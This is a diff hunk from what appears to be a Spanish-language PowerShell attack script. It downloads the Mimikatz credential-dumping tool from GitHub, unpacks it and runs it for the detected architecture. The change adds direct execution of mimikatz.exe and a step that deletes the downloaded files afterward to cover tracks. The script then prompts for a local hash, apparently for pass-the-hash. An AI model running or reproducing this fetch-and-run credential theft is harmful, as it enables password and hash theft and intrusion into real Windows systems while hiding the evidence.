@@ -83,9 +83,10 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip
-	if($system -in '32 bits') { cd .\mimikatz\Win32\mimikatz.exe }
-	if($system -in '64 bits') { cd .\mimikatz\x64\mimikatz.exe }
-        Write-Host ""
+	if($system -in '32 bits') { .\mimikatz\Win32\mimikatz.exe }
+	if($system -in '64 bits') { .\mimikatz\x64\mimikatz.exe }
+        del .\mimikatz\ , .\mimikatz.exe
+	Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
         if($hash -like 's*') { 
